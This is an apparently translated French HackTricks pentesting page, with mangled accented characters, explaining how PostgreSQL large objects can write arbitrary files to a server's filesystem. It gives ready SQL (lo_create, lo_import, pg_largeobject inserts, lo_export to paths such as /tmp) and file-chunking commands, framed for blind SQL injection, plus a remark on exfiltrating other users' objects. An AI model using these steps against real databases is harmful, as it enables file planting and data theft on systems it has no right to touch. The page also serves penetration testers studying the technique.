<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

### Objets volumineux PostgreSQL

PostgreSQL propose une structure appel√©e **objets volumineux**, accessible via la table `pg_largeobject`, con√ßue pour stocker des types de donn√©es volumineux, tels que des images ou des documents PDF. Cette approche est avantageuse par rapport √† la fonction `COPY TO` car elle permet l'**exportation des donn√©es vers le syst√®me de fichiers**, garantissant une r√©plique exacte du fichier d'origine.

Pour **stocker un fichier complet** dans cette table, un objet doit √™tre cr√©√© dans la table `pg_largeobject` (identifi√© par un LOID), suivi de l'insertion de morceaux de donn√©es, chacun de 2 Ko, dans cet objet. Il est crucial que ces morceaux fassent exactement 2 Ko (√† l'exception √©ventuelle du dernier morceau) pour garantir le bon fonctionnement de la fonction d'exportation.

Pour **diviser vos donn√©es binaires** en morceaux de 2 Ko, les commandes suivantes peuvent √™tre ex√©cut√©es :
```bash
split -b 2048 your_file # Creates 2KB sized files
```
Pour encoder chaque fichier en Base64 ou en Hex, les commandes ci-dessous peuvent √™tre utilis√©es :
```bash
base64 -w 0 <Chunk_file> # Encodes in Base64 in one line
xxd -ps -c 99999999999 <Chunk_file> # Encodes in Hex in one line
```
**Important** : Lors de l'automatisation de ce processus, assurez-vous d'envoyer des morceaux de 2 Ko d'octets en texte clair. Les fichiers encod√©s en hexad√©cimal n√©cessiteront 4 Ko de donn√©es par morceau en raison du doublement de la taille, tandis que les fichiers encod√©s en Base64 suivent la formule `ceil(n / 3) * 4`.

Le contenu des grands objets peut √™tre consult√© √† des fins de d√©bogage en utilisant :
```sql
select loid, pageno, encode(data, 'escape') from pg_largeobject;
```
#### Utilisation de `lo_creat` & Base64

Pour stocker des donn√©es binaires, un LOID est d'abord cr√©√© :
```sql
SELECT lo_creat(-1);       -- Creates a new, empty large object
SELECT lo_create(173454);  -- Attempts to create a large object with a specific OID
```
Dans les situations n√©cessitant un contr√¥le pr√©cis, comme l'exploitation d'une Injection SQL Aveugle, `lo_create` est pr√©f√©r√© pour sp√©cifier un LOID fixe.

Les morceaux de donn√©es peuvent ensuite √™tre ins√©r√©s comme suit:
```sql
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 0, decode('<B64 chunk1>', 'base64'));
INSERT INTO pg_largeobject (loid, pageno, data) VALUES (173454, 1, decode('<B64 chunk2>', 'base64'));

```
Pour exporter et potentiellement supprimer l'objet volumineux apr√®s utilisation :
```sql
SELECT lo_export(173454, '/tmp/your_file');
SELECT lo_unlink(173454);  -- Deletes the specified large object
```
#### Utilisation de `lo_import` & Hex

La fonction `lo_import` peut √™tre utilis√©e pour cr√©er et sp√©cifier un LOID pour un grand objet :
```sql
select lo_import('/path/to/file');
select lo_import('/path/to/file', 173454);
```
Apr√®s la cr√©ation de l'objet, les donn√©es sont ins√©r√©es par page, en veillant √† ce que chaque morceau ne d√©passe pas 2 Ko :
```sql
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=0;
update pg_largeobject set data=decode('<HEX>', 'hex') where loid=173454 and pageno=1;
```
Pour compl√©ter le processus, les donn√©es sont export√©es et le grand objet est supprim√© :
```sql
select lo_export(173454, '/path/to/your_file');
select lo_unlink(173454);  -- Deletes the specified large object
```
### Limitations

Il est not√© que **les grands objets peuvent avoir des ACL** (Listes de Contr√¥le d'Acc√®s), restreignant potentiellement l'acc√®s m√™me aux objets cr√©√©s par votre utilisateur. Cependant, les anciens objets avec des ACL permissives peuvent toujours √™tre accessibles pour l'exfiltration de contenu.

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert de l'√©quipe rouge HackTricks AWS)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF** Consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La Famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts github.

</details>
